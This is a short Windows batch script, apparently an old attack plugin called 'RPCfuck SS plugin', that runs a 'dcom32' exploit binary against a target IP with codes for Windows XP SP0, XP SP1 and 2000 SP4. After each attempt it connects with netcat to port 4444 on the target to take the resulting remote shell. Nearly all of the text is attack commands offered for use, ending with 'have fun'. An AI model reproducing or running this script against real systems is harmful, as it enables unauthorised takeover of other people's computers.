@echo on
@echo .....................................................
@echo              -= RPCfuck SS plugin =-
@echo .....................................................
@echo            by morning_wood@e2-labs.com
@echo ....................................................
wait
@echo ... trying XP and Win2k SP4 .....
@echo .
@echo ..
@echo   ... trying XP Service Pack 0
dcom32 5 %1
nc -v -n %1 4444

wait
@echo trying XP Service Pack 1
dcom32 6 %1
nc -v -n %1 4444

wait
@echo trying 2K Service Pack 4
dcom32 4 %1
nc -v -n %1 4444
wait
@echo ........... have fun
wait
@echo bye now

exit